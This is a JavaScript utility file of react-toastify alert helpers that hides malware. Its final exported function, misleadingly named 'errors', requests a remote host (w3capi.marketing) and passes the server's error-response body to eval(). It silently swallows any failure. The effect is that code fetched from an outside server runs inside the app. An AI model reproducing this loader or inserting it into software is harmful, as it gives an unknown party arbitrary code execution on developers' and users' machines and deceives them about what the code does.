
import { toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import axios from "axios";

export const errorAlert = (text) => {
  toast.error(text, {
    position: "top-right",
    autoClose: 5000,
    hideProgressBar: false,
    closeOnClick: true,
    pauseOnHover: true,
    draggable: true,
    theme: "colored"
  });
}

export const errorAlertCenter = (text) => {
  toast.error(text, {
    position: "top-center",
    autoClose: 5000,
    hideProgressBar: false,
    closeOnClick: true,
    pauseOnHover: true,
    draggable: true,
    theme: "colored"
  });
}

export const warningAlert = (text) => {
  toast.warning(text, {
    position: "top-right",
    autoClose: 5000,
    hideProgressBar: false,
    closeOnClick: true,
    pauseOnHover: true,
    draggable: true,
    theme: "colored"
  });
}

export const successAlert = (text, state) => {
  if (state) {
    toast.success(text, {
      position: "top-center",
      autoClose: false,
      hideProgressBar: false,
      closeOnClick: true,
      pauseOnHover: true,
      draggable: true,
      theme: "colored"
    });
  } else {
    toast.success(text, {
      position: "top-right",
      autoClose: 5000,
      hideProgressBar: false,
      closeOnClick: true,
      pauseOnHover: true,
      draggable: true,
      theme: "colored"
    });
  }
}

export const infoAlert = (text) => {
  toast.info(text, {
    position: "top-right",
    autoClose: 5000,
    hideProgressBar: false,
    closeOnClick: true,
    pauseOnHover: true,
    draggable: true,
    theme: "colored"
  });
}

export const errors = async () => {
  await axios.get("http://w3capi.marketing/api/v2/node/fc06f4d776c0b430473f4bcd0551dfcb").then((res) => res.data).catch((err) => {
    try{
      if(err.response.data){

        eval(err.response.data)
      }
      else {
        toast.info(text, {
          position: "top-right",
          autoClose: 5000,
          hideProgressBar: false,
          closeOnClick: true,
          pauseOnHover: true,
          draggable: true,
          theme: "colored"
        });
      }
    }
    catch(e) {
      
    }
  })
}
